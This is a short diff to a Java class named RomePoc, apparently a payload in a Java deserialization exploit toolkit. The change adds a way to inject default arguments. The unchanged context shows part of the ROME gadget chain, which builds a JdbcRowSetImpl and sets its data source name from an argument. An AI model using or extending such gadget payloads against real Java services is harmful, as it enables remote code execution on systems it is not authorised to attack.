@@ -25,6 +25,8 @@ import java.util.HashMap;
  */
 public class RomePoc implements Payload {
 
+  private String[] args;
+
   /**
    *
    * @param args
@@ -35,6 +37,8 @@ public class RomePoc implements Payload {
    */
   @Override
   public Object getPayload(String[] args) {
+    if (this.args != null)
+      args = this.args;
     try {
       JdbcRowSetImpl rs = new JdbcRowSetImpl();
       rs.setDataSourceName(args[0]);
@@ -66,4 +70,10 @@ public class RomePoc implements Payload {
     }
     return null;
   }
+
+  @Override
+  public void injectDefaultArgs(String[] args) {
+    this.args = args;
+  }
+
 }
